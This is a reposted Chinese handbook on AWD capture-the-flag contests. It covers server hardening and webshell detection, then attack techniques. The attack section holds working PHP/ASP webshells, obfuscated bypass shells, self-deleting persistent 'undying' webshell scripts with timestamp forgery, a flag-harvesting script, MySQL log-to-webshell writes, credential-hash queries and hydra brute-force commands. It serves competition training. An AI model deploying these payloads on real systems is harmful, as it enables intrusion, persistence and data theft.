# 转载
：  AWD比赛入门攻略总结

# AWD比赛入门攻略总结

> 
**这是一本能让你从零开始学习AWD并深入AWD的手册**


**目录**

[纸上得来终觉浅,绝知此事要躬行。](#%E7%BA%B8%E4%B8%8A%E5%BE%97%E6%9D%A5%E7%BB%88%E8%A7%89%E6%B5%85%2C%E7%BB%9D%E7%9F%A5%E6%AD%A4%E4%BA%8B%E8%A6%81%E8%BA%AC%E8%A1%8C%E3%80%82)

[0# 什么是AWD](#0%23%20%E4%BB%80%E4%B9%88%E6%98%AFAWD)

[0.1# AWD赛制介绍](#0.1%23%20AWD%E8%B5%9B%E5%88%B6%E4%BB%8B%E7%BB%8D)

[0.2# 比赛整体流程](#0.2%23%20%E6%AF%94%E8%B5%9B%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B)

[1# 比赛环境](#1%23%20%E6%AF%94%E8%B5%9B%E7%8E%AF%E5%A2%83)

[2# 安全加固环节（Defense）](#2%23%20%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA%E7%8E%AF%E8%8A%82%EF%BC%88Defense%EF%BC%89)

[2.0# 基本加固流程](#2.0%23%20%E5%9F%BA%E6%9C%AC%E5%8A%A0%E5%9B%BA%E6%B5%81%E7%A8%8B)

[2.0.1 Windows加固流程](#2.0.1%20Windows%E5%8A%A0%E5%9B%BA%E6%B5%81%E7%A8%8B)

[2.0.2 Linux加固流程](#2.0.2%20Linux%E5%8A%A0%E5%9B%BA%E6%B5%81%E7%A8%8B)

[2.1# 基本信息搜集](#2.1%23%20%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86)

[2.1.1 明确Linux机器信息](#2.1.1%20%E6%98%8E%E7%A1%AELinux%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF)

[2.1.2 明确Windows机器信息](#2.1.2%20%E6%98%8E%E7%A1%AEWindows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF)

[2.1.3 查看开放端口](#2.1.3%20%E6%9F%A5%E7%9C%8B%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3)

[2.1.4 默认口令（弱口令）更改](#2.1.4%20%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%EF%BC%88%E5%BC%B1%E5%8F%A3%E4%BB%A4%EF%BC%89%E6%9B%B4%E6%94%B9)

[2.1.5 找本地Flag](#2.1.5%20%E6%89%BE%E6%9C%AC%E5%9C%B0Flag)

[2.1.6 设置禁Ping](#2.1.6%20%E8%AE%BE%E7%BD%AE%E7%A6%81Ping)

[2.2# Web安全加固](#2.2%23%20Web%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA)

[2.2.1 备份源码](#2.2.1%20%E5%A4%87%E4%BB%BD%E6%BA%90%E7%A0%81)

[2.2.2 设置只读权限](#2.2.2%20%E8%AE%BE%E7%BD%AE%E5%8F%AA%E8%AF%BB%E6%9D%83%E9%99%90)

[2.2.3 配置 .htaccess](#2.2.3%20%E9%85%8D%E7%BD%AE%C2%A0.htaccess)

[2.2.4 PHP参数安全配置](#2.2.4%20PHP%E5%8F%82%E6%95%B0%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE)

[2.3# 数据库安全加固](#2.3%23%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA)

[2.3.1 Mysql加固](#2.3.1%20Mysql%E5%8A%A0%E5%9B%BA)

[2.3.2 Mssql加固](#2.3.2%20Mssql%E5%8A%A0%E5%9B%BA)

[2.4# 远程控制加固](#2.4%23%20%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%8A%A0%E5%9B%BA)

[2.4.1 SSH安全加固](#2.4.1%20SSH%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA)

[2.4.2 RDP远程登录安全加固](#2.4.2%20RDP%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA)

[2.5# 应急响应](#2.5%23%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94)

[2.5.1 查询进程线程](#2.5.1%20%E6%9F%A5%E8%AF%A2%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B)

[2.5.2 杀掉进程](#2.5.2%20%E6%9D%80%E6%8E%89%E8%BF%9B%E7%A8%8B)

[2.5.3 搜索WebShell文件](#2.5.3%20%E6%90%9C%E7%B4%A2WebShell%E6%96%87%E4%BB%B6)

[2.5.4 查杀不死马](#2.5.4%20%E6%9F%A5%E6%9D%80%E4%B8%8D%E6%AD%BB%E9%A9%AC)

[2.5.5 杀弹反弹shell](#2.5.5%20%E6%9D%80%E5%BC%B9%E5%8F%8D%E5%BC%B9shell)

[3# 自由攻击环节（Attack）](#3%23%20%E8%87%AA%E7%94%B1%E6%94%BB%E5%87%BB%E7%8E%AF%E8%8A%82%EF%BC%88Attack%EF%BC%89)

[3.0# 主要准备内容](#3.0%23%20%E4%B8%BB%E8%A6%81%E5%87%86%E5%A4%87%E5%86%85%E5%AE%B9)

[3.1# 基本信息搜集](#3.1%23%20%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86)

[3.1.1 主机信息搜集](#3.1.1%20%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86)

[3.1.2 端口扫描](#3.1.2%20%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F)

[3.2# 外部打点](#3.2%23%20%E5%A4%96%E9%83%A8%E6%89%93%E7%82%B9)

[3.2.0 常见系统漏洞](#3.2.0%20%E5%B8%B8%E8%A7%81%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E)

[3.2.1 中间件漏洞](#3.2.1%20%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E)

[3.2.2 集成服务环境漏洞](#3.2.2%20%E9%9B%86%E6%88%90%E6%9C%8D%E5%8A%A1%E7%8E%AF%E5%A2%83%E6%BC%8F%E6%B4%9E)

[3.2.3 CMS漏洞利用](#3.2.3%20CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8)

[3.2.4 上传WebShell](#3.2.4%20%E4%B8%8A%E4%BC%A0WebShell)

[3.2.5 利用WebShell](#3.2.5%20%E5%88%A9%E7%94%A8WebShell)

[3.2.6 MySQL数据库利用](#3.2.6%20MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8)

[3.2.7 弱口令爆破](#3.2.7%20%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4)

[3.3# 内网渗透](#3.3%23%20%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F)

[3.3.1 权限维持之不死马](#3.3.1%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E4%B8%8D%E6%AD%BB%E9%A9%AC)

[3.3.2 关键文件检索](#3.3.2%20%E5%85%B3%E9%94%AE%E6%96%87%E4%BB%B6%E6%A3%80%E7%B4%A2)

[3.3.3 Linux提权](#3.3.3%20Linux%E6%8F%90%E6%9D%83)

[3.3.4 Windows提权](#3.3.4%20Windows%E6%8F%90%E6%9D%83)

[4# 参考链接](#4%23%20%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5)

---


**手册版本号：V1.2.2-2023/10/21**

这是一本能让你从零开始学习AWD并深入AWD的手册，如果你要参加AWD相关比赛，相信本项目能给你带来帮助~

**如果你觉得本项目不错，欢迎给我点个赞，万分感谢~~ 有什么新的攻击或者防守的姿势、手法，欢迎与我交流**

### 0# 什么是AWD

#### 0.1# AWD赛制介绍

「 攻防模式 | AWD (Attack With Defense) 」 是 CTF比赛 「CTF Capture The Flag」 几种主要的比赛模式之一，该模式常见于线下赛。

在该模式中，每个队伍都拥有一个相同的初始环境 ( 我们称其为 GameBox )，该环境通常运行着一些特定的服务或应用程序，而这些服务通常包含一些安全漏洞。参赛队伍需要挖掘利用对方队伍服务中的安全漏洞，获取 Flag 以获得积分; 同时，参赛队伍也需要修补自身服务漏洞进行防御，以防被其他队伍攻击和获取 Flag。

主要特点为：强调实战性、实时性、对抗性，综合考量竞赛队的渗透能力和防护能力。

#### 0.2# 比赛整体流程

### 1# 比赛环境

通常比赛环境有以下三种情况：

### 2# 安全加固环节（Defense）

#### 2.0# 基本加固流程

##### 2.0.1 Windows加固流程

先备份：Web源码、数据库
1. 445加固，开启防火墙或IP高级安全策略1. 开启系统日志审计功能1. 禁用guest账户、关闭文件共享1. 确保启动项内容是可控的1. 限制3389远程访问控制的连接数：在本地组策略编辑器里面，依次展开计算机配置--&gt;管理模板--&gt;Windows组件--&gt;远程桌面服务--&gt;远程桌面会话主机--&gt;连接--&gt;限制连接的数量1. 使用工具监控关键目录文件:文件操作监控.exe、御剑文件监控.exe1. 恶意代码文件，通过PCHunter、Monitor查找1. Web目录环境查找相关可疑文件：jpg/png/rar，查看属性、解压看文件内容1. NTFS扫描磁盘查找隐藏的交换流数据1. 查找系统所有账户信息，禁止非Administrator账户1. 修改Web站点管理员访问路径、默认口令、数据库口令1. 安装WAF脚本，防护Web站点，禁止其他漏洞
##### 2.0.2 Linux加固流程

先备份：Web源码、数据库
1. 系统口令修改，团队统一口令1. 通过 `.bash_history` 查找历史命令操作，发现痕迹1. 查看计划任务：`crontab -l`；编辑计划任务：`crontab -e`1. 查看 `/etc/init.d/rc.local` 中启动服务有无异常1. 使用脚本开启进程监控、目录监控、流量监控1. Web站点口令,站点管理员路径修改1. 系统加固：iptable
#### 2.1# 基本信息搜集

在防守的时候，信息搜集也很重要，正所谓“知己知彼，百战不殆”

##### 2.1.1 明确Linux机器信息

```
uname -a                       //系统信息
ps -aux                        //查询进程信息
ps -ef | grep 进程名称         //筛选指定进程
id                             //用于显示用户ID，以及所属群组ID
cat /etc/passwd                //查看用户情况
ls /home/                      //查看用户情况
find / -type d -perm -002      //可写目录检查
ifconfig                       //Linux上查看网卡信息

```

##### 2.1.2 明确Windows机器信息

```
whoami /all                    //Windows上查看用户详细信息
ipconfig  /all                 //Windows上查看网卡信息

```

##### 2.1.3 查看开放端口

```
netstat                                                       //查看活动连接
netstat -ano/-a                                               //查看端口情况
netstat -anp                                                  //查看端口
firewall-cmd --zone= public --remove-port=80/tcp –permanent   //关闭端口
firewall-cmd –reload                                          //防火墙重启

```

##### 2.1.4 默认口令（弱口令）更改

为了防范弱口令攻击，Mysql密码默认都是root，phpstudy默认密码123456

还有其他默认密码admin，top100， top1000等

**尤其是WEB应用的后台密码修改**

```
passwd username                                                  //ssh口令修改
set password for mycms@localhost = password('18ciweufhi28746');  //MySQL密码修改
find /var/www//html -path '*config*’                             //查找配置文件中的密码凭证

```

##### 2.1.5 找本地Flag

```
grep -r "flag" /var/www/html/  //Linux：在Web目录下查找flag
findstr /s /i "flag" *.*       //Windows：当前目录以及所有子目录下的所有文件中查找"flag"这个字符串

```

##### 2.1.6 设置禁Ping

```
echo "1" &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all     //临时开启禁ping
echo "0" &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all     //关闭禁ping

```

#### 2.2# Web安全加固

##### 2.2.1 备份源码

防止在对源码进行修改时出问题，或者被攻击方删除源码而准备

压缩源码：

```
tar -cvf web.tar /var/www/html
zip -q -r web.zip /var/www/html

```

解压缩源码：

```
tar -xvf web.tar -c /var/www/html
unzip web.zip -d /var/www/html

```

备份源码：

```
mv web.tar /tmp
mv web.zip /home/xxx

```

上传和下载源码：

```
scp username@servername:/path/filename /tmp/local_destination  //从服务器下载单个文件到本地
scp /path/local_filename username@servername:/path             //从本地上传单个文件到服务器
scp -r username@servername:remote_dir/ /tmp/local_dir          //从服务器下载整个目录到本地
scp -r /tmp/local_dir username@servername:remote_dir           //从本地上传整个目录到服务器

```

##### 2.2.2 设置只读权限

对Web文件设置只读和执行权限（PHP等动态语言需要执行权限）

```
chmod 0555 /var/www/html/*
chmod 0555 /var/www/html/*.php

```

Web根目录设置只读和执行权限

```
chmod 0555 /var/www/html

```

改变文件的属主和属组来设置严格的权限

```
chown -R root:root /var/www/html/        //设置拥有人为 root:root 或 httpd:httpd (推荐)
chown -R apache:apache /var/www/html/    //确保 apache 拥有 /var/www/html/

```

##### 2.2.3 配置 `.htaccess`

利用 `.htaccess` 配置文件禁止php文件执行

```
&lt;Directory "/var/www/html/upload"&gt;   //指定目录后续的指令将应用于该目录
Options -ExecCGI -Indexes            //禁用了目录中的 CGI 执行和目录索引（显示目录内容列表）功能。
AllowOverride None                   //不允许在该目录中使用 .htaccess 文件来覆盖服务器的配置。
RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml  
RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml      
//这两个指令移除指定文件扩展名的处理器和类型。
//在这种情况下，这些指令从 Apache 的处理列表中移除了与 PHP 相关的扩展名和服务器端包含（SSI）文件类型。
php_flag engine off     //这个指令将 PHP 的引擎标志（engine）设置为关闭状态，从而禁用了在该目录中执行 PHP 脚本的能力。
&lt;FilesMatch ".+\.ph(p[3457]?|t|tml)$"&gt;
deny from all
&lt;/FilesMatch&gt;  //这三行命令使用正则表达式匹配了以 .php、.phtml、.php3、.pht、.php4、.php5、.php7、.shtml 结尾的文件，并将其访问权限设置为拒绝所有
&lt;/Directory&gt;

```

##### 2.2.4 PHP参数安全配置

首先找到PHP的配置文件

```
/etc/php/{version}/php.ini

```

禁用高危函数

```
disable_functions = dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link

```

配置 `open_basedir` （将用户访问文件的活动范围限制在指定的区域）

```
open_basedir=/var/www/html

```

禁用魔术引号（自动对外部来源数据进行转义，防止SQL注入）

```
magic_quotes_gpc = Off

```

关闭PHP伪协议

```
allow_url_fopen = Off
allow_url_include = Off

```

重启PHP

```
sudo service php7.0-fpm restart
sudo systemctl restart php7.0-fpm.service

```

#### 2.3# 数据库安全加固

##### 2.3.1 Mysql加固

为了防范弱口令攻击，Mysql密码默认都是root，phpstudy默认密码123456
1. 不使用默认口令，修改成复杂的，并确保和web环境连接1. 设置只允许本地127.0.0.1账户登录：修改 `bind-address=127.0.0.1` ；在配置文件中加入 `seccure_file_priv=NULL`1. 开启日志审计功能：`general_log_file=`路径
因为最常用的是Mysql数据库，所以基本的攻防大部分都是用MySql数据库的命令

备份指定数据库：

```
mysqldump –u username –p password databasename &gt; target.sql

```

备份所有数据库：

```
mysqldump –all -databases &gt; all.sql

```

导入数据库：

```
mysql –u username –p password database &lt; from.sql

```

对于MySQL的攻防，可以看这篇文章：[MySQL不出网文件落地上线姿势 - AabyssZG's Blog](https://blog.zgsec.cn/archives/26.html)

MySQL默认配置文件路径：

```
C:\\Program Files\MySQL\MySQLServer 5.1\my.ini   //Windows
/etc/my.cnf                                      //Linux
/etc/mysql/my.cnf                                //Linux

```

修改 `secure_file_priv` 参数（日志功能的对应目录）

```
secure_file_priv=""

```

重载MySQL配置

```
FLUSH PRIVILEGES

```

重启MySQL服务

```
sudo service mysql restart
sudo systemctl restart mysql

```

##### 2.3.2 Mssql加固
1. 删除不必要的账号1. SQLServer用户口令安全1. 根据用户分配帐号避免帐号共享1. 分配数据库用户所需的最小权限1. 网络访问限制1. SQLServer登录审计1. SQLServer安全事件审计1. 配置日志功能
#### 2.4# 远程控制加固

##### 2.4.1 SSH安全加固

限制IP登录方法

```
sudo nano /etc/ssh/sshd_config       //以root权限编辑SSH配置文件
AllowUsers username@192.168.0.100    //找到并编辑以下行，确保其取消注释并设置为所需的IP地址

```

禁用 `root` 远程登录

```
sudo nano /etc/ssh/sshd_config       //以root权限编辑SSH配置文件
PermitRootLogin no                   //将PermitRootLogi设置为“no”

```

按用户和组限制SSH登录

```
sudo nano /etc/ssh/sshd_config       //以root权限编辑SSH配置文件
AllowUsers testuser                  //设置只允许 testuser 登录SSH
AllowUsers testuser@192.168.1.100    //设置只允许 192.168.1.100 的机器用 testuser 账户登录SSH
AllowGroups test                     //设置用户组白名单
//需要注意的是：如果同时指定了 AllowUsers 与 AllowGroups 那么必须要在两个选项中都匹配到的用户才能进行SSH登录

```

重启SSH服务

```
sudo service sshd restart
sudo systemctl restart sshd.service

```

##### 2.4.2 RDP远程登录安全加固

删除默认帐户并手动添加新用户：

更改默认RDP端口号：

#### 2.5# 应急响应

##### 2.5.1 查询进程线程

```
netstat
ps -aux
netstat -apt

```

##### 2.5.2 杀掉进程

```
kill -9 pid            //Linux上
taskkill /f /pid pid   //Windows上

```

##### 2.5.3 搜索WebShell文件

```
find /var/www/html -name *.php -mmin -5                        //查看最近5分钟修改文件
find ./ -name '*.php' | xargs wc -l | sort -u                  //寻找行数最短文件，一般有可能是一句话木马
grep -r --include=*.php  '[^a-z]eval($_POST'  /var/www/html    //查包含关键字的php文件
find /var/www/html -type f -name "*.php" | xargs grep "eval(" |more //在Linux系统中使用find、grep和xargs命令的组合，用于在指定目录（/var/www/html）下查找所有以.php为扩展名的文件，并搜索这些文件中包含字符串"eval("的行，并使用more命令来分页显示结果以便在输出较长时进行逐页查看

```

##### 2.5.4 查杀不死马

也可以利用命令自动进行查找删除

```
ps -aux | grep www-data | grep -v grep | awk '{print $2}' | xargs kill -9

```

然后重启服务

```
service php-fpm restart

```

##### 2.5.5 杀弹反弹shell

老规矩查看进程

```
ps -ef
px -aux
ps -aux | grep www-data

```

注意 `www-data` 权限的 `/bin/sh`，很有可能是nc

再就是上老一套命令

```
kill ps -aux | grep www-data | grep apache2 | awk '{print $2}'

```

### 3# 自由攻击环节（Attack）

#### 3.0# 主要准备内容
1. 各类CMS软件包最新版准备1. 扫描工具：Nmap、Nessus、Metasploit更新1. 漏洞利用脚本Poc、Exp
#### 3.1# 基本信息搜集

##### 3.1.1 主机信息搜集

Nmap

```
namp -sn 192.168.0.0/24            //C段存活扫描

```

httpscan

```
httpscan.py 192.168.0.0/24 –t 10   //C段存活扫描

```

##### 3.1.2 端口扫描

```
nmap -sV 192.168.0.2               //扫描主机系统版本
nmap -sS 192.168.0.2               //扫描主机常用端口
nmap -sS -p 80,445 192.168.0.2     //扫描主机部分端口
nmap -sS -p- 192.168.0.2           //扫描主机全部端口

```

Python脚本

```
import requests

for x in range(2,255): 
    url = "http://192.168.1.{}".format(x) 
    try: 
        r = requests.post(url) 
        print(url) 
        except: 
        pass

```

#### 3.2# 外部打点

##### 3.2.0 常见系统漏洞

##### 3.2.1 中间件漏洞

##### 3.2.2 集成服务环境漏洞

##### 3.2.3 CMS漏洞利用

搜集最新版本的CMS，以及对应的漏洞Poc和Exp，这里仅仅列举部分CMS：

备份文件爆破：使用7kbScan等目录扫描工具对Web系统进行爆破

##### 3.2.4 上传WebShell

常见一句话木马

```
PHP： &lt;?php @eval($_POST['pass']);?&gt;      &lt;?php eval($_GET['pass']);
Asp：   &lt;%eval request ("pass")%&gt;
Aspx：  &lt;%@ Page Language="Jscript"%&gt; &lt;%eval(Request.Item["pass"],"unsafe");%&gt;

```

Get型木马

```
&lt;?php eval($_GET['pass']);           //利用方式/shell.php?pass=eval($_POST[1]);

```

免杀马制作：[GitHub - AabyssZG/WebShell-Bypass-Guide: 从零学习Webshell免杀手册](https://github.com/AabyssZG/WebShell-Bypass-Guide)

```
&lt;?=~$_='$&lt;&gt;/'^'{{{{';@${$_}[_](@${$_}[__]);                            //执行GET传参 ?_=system&amp;__=whoami 来执行whoami命令
&lt;?=~$_='$&lt;&gt;/'^'{{{{';$___='$+4(/' ^ '{{{{{';@${$_}[_](@${$___}[__]);   //执行GET传参 ?_=assert 和POST传参 __=PHP代码来GetShell

```

隐藏的文件读取

```
&lt;?php
header(php'flag:'.file_get_contents('/flag'));

```

条件允许的话，将flag信息直接读取并返回到header头中，这样做不易被发现

##### 3.2.5 利用WebShell

curl(跟hackbar差不多)

```
C:\Users\admin&gt;curl "http://192.168.182.130:8801/include/shell.php" -d "admin_ccmd=system('cat /f*');"
//向shell.php文件里传入参数并返回结果

```

Python多端口传参

```
#coding=utf-8
import requests

url_head="http://192.168.182.130"   #网段
url=""
shell_addr="/upload/url/shell.php" #木马路径
passwd="pass"                   #木马密码
#port="80"
payload = {passwd: 'System(\'cat /flag\');'}
# find / -name "flag*"

#清空上次记录
flag=open("flag.txt","w")
flag.close()
flag=open("flag.txt","a")

for i in range(8000,8004):
    url=url_head+":"+str(i)+shell_addr
    try:
        res=requests.post(url,payload)#,timeout=1
        if res.status_code == requests.codes.ok:
            result = res.text
            print (result)
            flag.write(result+"\n") 
        else:
            print ("shell 404")
    except:
        print (url+" connect shell fail")

flag.close()

```

##### 3.2.6 MySQL数据库利用

具体可以看这篇文章：[MySQL不出网文件落地上线姿势 - AabyssZG's Blog](https://blog.zgsec.cn/archives/26.html)

1、查看MySQL版本

```
show variables like '%version%';
select version();      #这个只显示MySQL版本号

```

2、查看 `load_file()` 开启状态

```
show variables like '%secure%';       #这条可查看详细信息
show global variables like '%secure_file_priv%';

```

3、查看日志功能是否开启和对应目录

```
SHOW VARIABLES LIKE 'general%';
set global general_log = "ON";
set global general_log_file='/var/www/html/test.php';   #可以写入WebShell然后直接连接蚁剑

# 往日志里面写入 WebShell
select '&lt;?php @eval($_POST['AabyssTeam']);?&gt;';
# 此时已经写到 test.php 文件当中了，注意这个要知道网站的具体路径才可以实现

```

小技巧：获取MySQL账户和对应密码Hash

```
# MySQL &lt;= 5.6 版本
select host, user, password from mysql.user;

# MySQL &gt;= 5.7 版本
select host,user,authentication_string from mysql.user;

```

##### 3.2.7 弱口令爆破

爆破SSH密码

```
hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ssh
hydra -L 用户名字典.txt -P 密码字典.txt ssh://192.168.1.100
hydra -L 用户名字典.txt -P 密码字典.txt ssh://192.168.1.100 -s 40      //40是⽬标服务开放的端⼝

```

爆破FTP密码

```
hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ftp
hydra -L 用户名字典.txt -P 密码字典.txt ftp://192.168.1.100/

```

爆破RDP远程桌面密码

```
hydra 目标IP地址 rdp -l administrator -P 密码字典.txt -V

```

爆破Telnet

```
hydra 目标IP地址 telnet -l 用户字典.txt -P 密码字典.txt -f -V

```

爆破MSSQL数据库

```
hydra -l sa -P 密码字典.txt 目标IP地址 mssql

```

爆破MySQL数据库

```
hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 mysql

```

#### 3.3# 内网渗透

##### 3.3.1 权限维持之不死马

简单不死马：

```
&lt;?php
set_time_limit(0);   //PHP脚本限制了执行时间，set_time_limit(0)设置一个脚本的执行时间为无限长
ignore_user_abort(1);  //ignore_user_abort如果设置为 TRUE，则忽略与用户的断开，脚本将后台运行
unlink(__FILE__);     //删除自身

while(1)
{
    file_put_contents('shell.php','&lt;?php @eval($_POST["AabyssTeam"]);?&gt;');  //创建shell.php
    sleep(0);    //间隔时间
}

```

可以通过不断复写 `shell.php` 来达到该木马难以被使用的效果

防连接不死马：

```
&lt;?php
set_time_limit(0);   // 取消脚本运行时间的超时上限
ignore_user_abort(1);  // 

while(1)
{
    file_put_contents('shell.php','&lt;?php if(md5($_POST["passwd"])=="8c7d608cbb4c63f32be59a9ba8c9f49d"){@eval($_REQUEST["cmd"]);} ?&gt;');  //创建shell.php
    sleep(0);
}

//passwd=AabyssTeam
//POST传参：passwd=AabyssTeam&amp;cmd=system('ls');

```

进阶不死马：

```
&lt;?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = 'shell.php';
$code = '&lt;?php if(md5($_POST["passwd"])=="8c7d608cbb4c63f32be59a9ba8c9f49d"){@eval($_REQUEST["cmd"]);} ?&gt;';

while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2020-12-01 09:10:12" shell.php');  //修改时间，防止被删
    usleep(5000);
}
?&gt;

//passwd=AabyssTeam
//POST传参：passwd=AabyssTeam&amp;cmd=system('ls');

```

将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为 `shell.php` 的WebShell文件

双重不死马：

```
&lt;?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.login.php';
$file1 = '/admin/.register.php'; 
$code = '&lt;?php if(md5($_POST["passwd"])=="8c7d608cbb4c63f32be59a9ba8c9f49d"){@eval($_REQUEST["cmd"]);} ?&gt;';

while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2020-12-01 18:10:12" .login.php');
    file_put_contents($file1,$code);
    system('touch -m -d "2020-12-01 18:10:12" /admin/.register.php');
    usleep(5000);
}
?&gt;

//passwd=AabyssTeam
//POST传参：passwd=AabyssTeam&amp;cmd=system('ls');

```

浏览器访问写入的WebShell，会自动生成两个不死马： `.login.php` 和 `/admin/.register.php`

##### 3.3.2 关键文件检索

组件检索

```
find / -name "apaech2.conf"                 //检索Apache主配置文件
find / -name "nginx.conf"                   //检索Nginx目录
find / -path "*nginx*" -name nginx*conf     //检索Nginx配置目录
find / -name "httpd.conf"                   //检索Apache目录
find / -path "*apache*" -name apache*conf   //检索Apache配置目录

```

网站首页

```
find / -name "index.php"                    //定位网站目录
find / -name "index.html"                   //定位网站目录

```

日志文件检索

```
/var/log/nginx/                           //默认Nginx日志目录
/var/log/apache/                          //默认Apache日志目录
/var/log/apache2/                         //默认Apache日志目录
/usr/local/tomcat/logs                    //Tomcat日志目录
tail -f xxx.log                           //实时刷新滚动日志文件

```

##### 3.3.3 Linux提权

查询系统版本信息命令：

```
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release

```

查询内核版本信息命令：

```
uname -a
uname -mrs
cat /proc/version
cat /etc/issue
lsb_release -a
hostnamectl  
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz

```

查看系统环境变量命令：

```
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set

```

查看语言环境信息命令：

```
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc
set

```

查看文件上传环境信息命令：

```
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp

```

这里列举一些可用利用的提权漏洞：

Kali命令查询：

```
searchsploit CentOS 7
searchsploit Ubuntu 16.04

```

提权Exploit寻找：

编译提权Exp

```
gcc -o /usr/share/nginx/html/***** /usr/share/nginx/html/*****.c -Wall

```

直接提权，确认权限：

```
cat /etc/shadow

```

其他提权姿势：[CentOS 7系统利用suid提权获取Root Shell - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/244627.html)

##### 3.3.4 Windows提权

这里列举一些Windows的漏洞：

### 4# 参考链接

```
原文链接：https://forum.butian.net/share/2536
```

## **免费领取安全学习资料包！~**<img alt="" height="768" src="https://img-blog.csdnimg.cn/a55e55c48251427680326a942510285a.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/02d97eeaef0d49878fccc80b2adc4b08.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/4ee34e1bf4504a128ef78eaf4417714e.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/7f18d03dfa8b47e1ba938ab186b17a40.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/46450bb5cb314ea6867f7f333b90a5ba.png" width="665"/>

应急响应笔记

学习路线
